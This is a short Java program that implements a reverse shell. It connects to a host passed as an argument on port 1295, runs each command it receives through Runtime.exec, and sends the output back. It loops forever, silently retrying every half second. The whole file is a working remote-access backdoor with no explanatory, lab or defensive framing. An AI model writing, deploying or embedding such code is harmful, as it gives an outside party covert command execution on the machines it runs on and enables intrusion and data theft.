import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class Main {
    public static void main(String[] args) throws InterruptedException {
        while (true) {
            try {
                Socket socket = new Socket(args[0], 1295);
                OutputStream outputStream = socket.getOutputStream();
                InputStream inputStream = socket.getInputStream();
                BufferedReader r = new BufferedReader(new InputStreamReader(inputStream));
                String index = r.readLine();
                try {
                    Process p = Runtime.getRuntime().exec(java.net.URLDecoder.decode(index, StandardCharsets.UTF_8.name()));
                    r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line = "";
                    String out = "";
                    while (true) {
                        line = r.readLine();
                        if (line == null) {
                            break;
                        }
                        out = out + line + "\n";
                    }
                    outputStream.write(out.getBytes(StandardCharsets.UTF_8));
                    outputStream.flush();
                } catch (IOException e) {
                    outputStream.write(e.getLocalizedMessage().getBytes(StandardCharsets.UTF_8));
                    outputStream.flush();
                }
            }catch (Exception e){
                //System.out.println(e.getLocalizedMessage());
                Thread.sleep(500);
            }
        }
    }
}
